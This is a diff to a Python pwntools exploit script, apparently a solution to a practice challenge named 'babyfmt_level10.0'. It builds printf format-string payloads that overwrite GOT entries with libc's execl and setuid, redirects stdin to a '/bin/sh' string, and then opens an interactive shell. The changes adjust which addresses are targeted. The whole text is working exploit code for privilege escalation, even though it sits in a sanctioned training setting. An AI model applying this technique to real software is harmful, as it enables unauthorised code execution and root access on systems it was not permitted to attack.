@@ -17,7 +17,7 @@ elif args.SSH:
     p=s.process("/challenge/babyfmt_level10.0")
 payload1=f"%{ (e.sym.func-85) & 0xffff}c%66$hnlmao%1$p".encode()
 payload1+=b"X"*(0x20-5-len(payload1))
-payload1+=p64(0x404068)
+payload1+=p64(e.got.exit)
 p.sendlineafter(b"After receiving your input, the program will run printf on your input and then exit.\n",
 payload1)
 p.recvuntil(b"lmao0x")
@@ -48,6 +48,7 @@ def overwrite_addr(addr, value,writebytes=6):
     p.sendlineafter(b"After receiving your input, the program will run printf on your input and then exit.\n",
     payload)
 overwrite_addr(e.got.setvbuf,libc.sym.execl)
-overwrite_addr(libc.sym._IO_2_1_stdin_,u64(b"/bin/sh\x00"),writebytes=8)
+#overwrite_addr(libc.sym._IO_2_1_stdin_,u64(b"/bin/sh\x00"),writebytes=8)
+overwrite_addr(e.sym.stdin,next(libc.search(b"/bin/sh")))
 overwrite_addr(e.got.exit,libc.sym.setuid)
 p.interactive()
